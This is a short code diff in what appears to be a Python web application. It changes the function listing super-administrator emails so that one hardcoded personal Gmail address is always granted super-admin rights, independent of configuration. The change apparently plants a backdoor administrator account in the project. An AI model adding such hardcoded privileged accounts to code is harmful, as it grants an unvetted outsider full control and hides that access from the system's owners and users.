@@ -70,7 +70,7 @@ def _email_user_id(email: str) -> str:
 
 
 def _super_admin_emails() -> set[str]:
-    values = set()
+    values = {"allenni521314@gmail.com"}
     admin_email = getattr(settings, "admin_user_email", "")
     if admin_email:
         values.add(str(admin_email).strip().lower())
